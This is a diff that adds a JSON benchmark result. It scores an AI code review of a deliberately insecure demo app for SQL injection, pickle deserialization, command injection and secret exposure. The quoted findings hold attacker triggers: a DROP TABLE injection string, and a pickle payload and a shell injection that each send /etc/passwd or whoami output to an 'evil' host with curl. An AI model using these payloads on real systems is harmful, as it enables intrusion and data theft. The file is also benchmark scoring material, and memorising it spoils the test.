@@ -1,0 +1,436 @@
+{
+  "feature": "F70",
+  "mode": "live",
+  "at": "2026-08-01T12:24:55Z",
+  "model": "deepseek/deepseek-v4-pro",
+  "hermes_rc": 0,
+  "review": "docs/benchmarks/traces/f172-refine-decay-federate/live/review-bench-f70.md",
+  "score": {
+    "feature": "F70",
+    "pack_id": "insecure-demo",
+    "verdict": "REQUEST_CHANGES",
+    "expected_verdict": "REQUEST_CHANGES",
+    "verdict_ok": true,
+    "tp": 4,
+    "fn": 0,
+    "required_total": 4,
+    "recall": 1.0,
+    "precision_proxy": 0.2353,
+    "cases": [
+      {
+        "case_id": "sqli-search",
+        "hit": true,
+        "matched_terms": [
+          "sql injection",
+          "sqli",
+          "f-string",
+          "f\"select",
+          "execute(f",
+          "cur.execute(f",
+          "cwe-89"
+        ],
+        "path_ok": true
+      },
+      {
+        "case_id": "pickle-load",
+        "hit": true,
+        "matched_terms": [
+          "pickle",
+          "deserialize",
+          "deserialization",
+          "cwe-502",
+          "pickle.loads"
+        ],
+        "path_ok": true
+      },
+      {
+        "case_id": "cmdi-run",
+        "hit": true,
+        "matched_terms": [
+          "command injection",
+          "shell=true",
+          "rce",
+          "subprocess",
+          "cwe-78"
+        ],
+        "path_ok": true
+      },
+      {
+        "case_id": "secret-exposure",
+        "hit": true,
+        "matched_terms": [
+          "secret",
+          "api_key",
+          "openrouter",
+          "credential",
+          "exposes",
+          "exposure"
+        ],
+        "path_ok": true
+      }
+    ],
+    "path_hits": [
+      {
+        "path": "demo/insecure/app.py",
+        "line": 18
+      },
+      {
+        "path": "demo/insecure/app.py",
+        "line": 26
+      },
+      {
+        "path": "demo/insecure/app.py",
+        "line": 33
+      },
+      {
+        "path": "demo/insecure/app.py",
+        "line": 38
+      },
+      {
+        "path": "scripts/torii.py",
+        "line": null
+      },
+      {
+        "path": "scripts/archival_memory_search.py auto --files app.py",
+        "line": null
+      },
+      {
+        "path": "torii.py",
+        "line": null
+      }
+    ],
+    "critic": {
+      "feature": "F70",
+      "pass": "dual_offline",
+      "effective_aware": true,
+      "graph_supersede_aware": true,
+      "graph_multi_hop": true,
+      "graph_supersede_edges": 0,
+      "graph_hop": {
+        "multi_hop": true,
+        "hops": 2,
+        "seed_n": 4,
+        "neighborhood_n": 4,
+        "seeds": [
+          "tp:cmdi-run",
+          "tp:pickle-load",
+          "tp:secret-exposure",
+          "tp:sqli-search"
+        ]
+      },
+      "effective_floor": 0.25,
+      "chunk_count": 17,
+      "likely_fp": 0,
+      "confirmed_tp": 4,
+      "stale_tp_match": 0,
+      "superseded_tp": 0,
+      "weak_evidence": 13,
+      "precision_proxy": 0.2353,
+      "effective_precision": 0.2235,
+      "findings": [
+        {
+          "index": 0,
+          "status": "confirmed_tp",
+          "has_path": true,
+          "paths": [
+            {
+              "path": "demo/insecure/app.py",
+              "line": 18
+            }
+          ],
+          "tp_signature_hits": [
+            "sqli-search",
+            "pickle-load",
+            "cmdi-run",
+            "secret-exposure"
+          ],
+          "tp_effective_max": 0.95,
+          "tp_effective_scores": [
+            0.95,
+            0.95,
+            0.95,
+            0.95
+          ],
+          "demote_reason": "",
+          "graph_filtered": null,
+          "preview": "All four findings below are blocking. No production deploy should proceed with any of these paths live.    | Issue | CWE | Severity | Endpoint | |---|---|---|---| | SQL injection |"
+        },
+        {
+          "index": 1,
+          "status": "weak_evidence",
+          "has_path": false,
+          "paths": [],
+          "tp_signature_hits": [
+            "sqli-search"
+          ],
+          "tp_effective_max": 0.95,
+          "tp_effective_scores": [
+            0.95
+          ],
+          "demote_reason": "",
+          "graph_filtered": null,
+          "preview": "**Sink:** `cur.execute(f\"SELECT * FROM items WHERE name = '{q}'\")` at line 18."
+        },
+        {
+          "index": 2,
+          "status": "weak_evidence",
+          "has_path": false,
+          "paths": [],
+          "tp_signature_hits": [
+            "cmdi-run"
+          ],
+          "tp_effective_max": 0.95,
+          "tp_effective_scores": [
+            0.95
+          ],
+          "demote_reason": "",
+          "graph_filtered": null,
+          "preview": "**Source:** `q = request.args.get(\"q\", \"\")` at line 15 \u2014 untrusted query parameter interpolated directly into SQL with no parameterization or escaping."
+        },
+        {
+          "index": 3,
+          "status": "weak_evidence",
+          "has_path": false,
+          "paths": [],
+          "tp_signature_hits": [],
+          "tp_effective_max": null,
+          "tp_effective_scores": [],
+          "demote_reason": "",
+          "graph_filtered": null,
+          "preview": "**Attacker trigger:** `GET /search?q='; DROP TABLE items; --` \u2014 the attacker controls the full SQL tail after the quote. Data exfiltration via `UNION SELECT` is also trivially reac"
+        },
+        {
+          "index": 4,
+          "status": "confirmed_tp",
+          "has_path": true,
+          "paths": [
+            {
+              "path": "demo/insecure/app.py",
+              "line": 26
+            }
+          ],
+          "tp_signature_hits": [
+            "sqli-search",
+            "pickle-load"
+          ],
+          "tp_effective_max": 0.95,
+          "tp_effective_scores": [
+            0.95,
+            0.95
+          ],
+          "demote_reason": "",
+          "graph_filtered": null,
+          "preview": "**Matches TP signature:** `sqli-search` (15 prior hits, CWE-89).  **2. Arbitrary code execution via pickle deserialization** \u2014 `demo/insecure/app.py:26`"
+        },
+        {
+          "index": 5,
+          "status": "weak_evidence",
+          "has_path": false,
+          "paths": [],
+          "tp_signature_hits": [
+            "pickle-load"
+          ],
+          "tp_effective_max": 0.95,
+          "tp_effective_scores": [
+            0.95
+          ],
+          "demote_reason": "",
+          "graph_filtered": null,
+          "preview": "**Sink:** `pickle.loads(data)` at line 26."
+        },
+        {
+          "index": 6,
+          "status": "weak_evidence",
+          "has_path": false,
+          "paths": [],
+          "tp_signature_hits": [
+            "pickle-load",
+            "cmdi-run"
+          ],
+          "tp_effective_max": 0.95,
+          "tp_effective_scores": [
+            0.95,
+            0.95
+          ],
+          "demote_reason": "",
+          "graph_filtered": null,
+          "preview": "**Source:** `data = request.data` at line 25 \u2014 raw POST body fed directly to `pickle.loads`."
+        },
+        {
+          "index": 7,
+          "status": "weak_evidence",
+          "has_path": false,
+          "paths": [],
+          "tp_signature_hits": [
+            "pickle-load"
+          ],
+          "tp_effective_max": 0.95,
+          "tp_effective_scores": [
+            0.95
+          ],
+          "demote_reason": "",
+          "graph_filtered": null,
+          "preview": "**Attacker trigger:** `POST /load` with a crafted pickle payload (`cos\\nsystem\\n(S'curl http://evil/$(cat /etc/passwd)'\\ntR.`) \u2014 pickle `__reduce__` executes arbitrary Python at de"
+        },
+        {
+          "index": 8,
+          "status": "confirmed_tp",
+          "has_path": true,
+          "paths": [
+            {
+              "path": "demo/insecure/app.py",
+              "line": 33
+            }
+          ],
+          "tp_signature_hits": [
+            "pickle-load",
+            "cmdi-run"
+          ],
+          "tp_effective_max": 0.95,
+          "tp_effective_scores": [
+            0.95,
+            0.95
+          ],
+          "demote_reason": "",
+          "graph_filtered": null,
+          "preview": "**Matches TP signature:** `pickle-load` (15 prior hits, CWE-502).  **3. Command injection via shell=True** \u2014 `demo/insecure/app.py:33`"
+        },
+        {
+          "index": 9,
+          "status": "weak_evidence",
+          "has_path": false,
+          "paths": [],
+          "tp_signature_hits": [
+            "cmdi-run"
+          ],
+          "tp_effective_max": 0.95,
+          "tp_effective_scores": [
+            0.95
+          ],
+          "demote_reason": "",
+          "graph_filtered": null,
+          "preview": "**Sink:** `subprocess.check_output(cmd, shell=True)` at line 33."
+        },
+        {
+          "index": 10,
+          "status": "weak_evidence",
+          "has_path": false,
+          "paths": [],
+          "tp_signature_hits": [
+            "cmdi-run"
+          ],
+          "tp_effective_max": 0.95,
+          "tp_effective_scores": [
+            0.95
+          ],
+          "demote_reason": "",
+          "graph_filtered": null,
+          "preview": "**Source:** `cmd = request.args.get(\"cmd\", \"echo hi\")` at line 32 \u2014 untrusted query parameter passed to a shell."
+        },
+        {
+          "index": 11,
+          "status": "weak_evidence",
+          "has_path": false,
+          "paths": [],
+          "tp_signature_hits": [],
+          "tp_effective_max": null,
+          "tp_effective_scores": [],
+          "demote_reason": "",
+          "graph_filtered": null,
+          "preview": "**Attacker trigger:** `GET /run?cmd=cat /etc/passwd; curl http://evil/$(whoami)` \u2014 shell metacharacters (`;`, `|`, `$()`, backticks) all execute. The default `echo hi` is safe but "
+        },
+        {
+          "index": 12,
+          "status": "confirmed_tp",
+          "has_path": true,
+          "paths": [
+            {
+              "path": "demo/insecure/app.py",
+              "line": 38
+            }
+          ],
+          "tp_signature_hits": [
+            "cmdi-run",
+            "secret-exposure"
+          ],
+          "tp_effective_max": 0.95,
+          "tp_effective_scores": [
+            0.95,
+            0.95
+          ],
+          "demote_reason": "",
+          "graph_filtered": null,
+          "preview": "**Matches TP signature:** `cmdi-run` (15 prior hits, CWE-78).  **4. Secrets exposure via unauthenticated endpoint** \u2014 `demo/insecure/app.py:38`"
+        },
+        {
+          "index": 13,
+          "status": "weak_evidence",
+          "has_path": false,
+          "paths": [],
+          "tp_signature_hits": [
+            "secret-exposure"
+          ],
+          "tp_effective_max": 0.95,
+          "tp_effective_scores": [
+            0.95
+          ],
+          "demote_reason": "",
+          "graph_filtered": null,
+          "preview": "**Sink:** `return {\"key\": os.environ.get(\"OPENROUTER_API_KEY\", \"missing\")}` at line 38."
+        },
+        {
+          "index": 14,
+          "status": "weak_evidence",
+          "has_path": false,
+          "paths": [],
+          "tp_signature_hits": [
+            "cmdi-run",
+            "secret-exposure"
+          ],
+          "tp_effective_max": 0.95,
+          "tp_effective_scores": [
+            0.95,
+            0.95
+          ],
+          "demote_reason": "",
+          "graph_filtered": null,
+          "preview": "**Source:** Process environment variable containing a live API credential."
+        },
+        {
+          "index": 15,
+          "status": "weak_evidence",
+          "has_path": false,
+          "paths": [],
+          "tp_signature_hits": [
+            "secret-exposure"
+          ],
+          "tp_effective_max": 0.95,
+          "tp_effective_scores": [
+            0.95
+          ],
+          "demote_reason": "",
+          "graph_filtered": null,
+          "preview": "**Attacker trigger:** `GET /secret` \u2014 any unauthenticated caller retrieves the plaintext key. If the key is set in the environment (default on many deployment platforms), the attac"
+        },
+        {
+          "index": 16,
+          "status": "weak_evidence",
+          "has_path": false,
+          "paths": [],
+          "tp_signature_hits": [
+            "secret-exposure"
+          ],
+          "tp_effective_max": 0.95,
+          "tp_effective_scores": [
+            0.95
+          ],
+          "demote_reason": "",
+          "graph_filtered": null,
+          "preview": "**Matches TP signature:** `secret-exposure` (15 prior hits, CWE-200/CWE-798)."
+        }
+      ]
+    },
+    "score_pct": 100.0,
+    "passed": true
+  }
+}
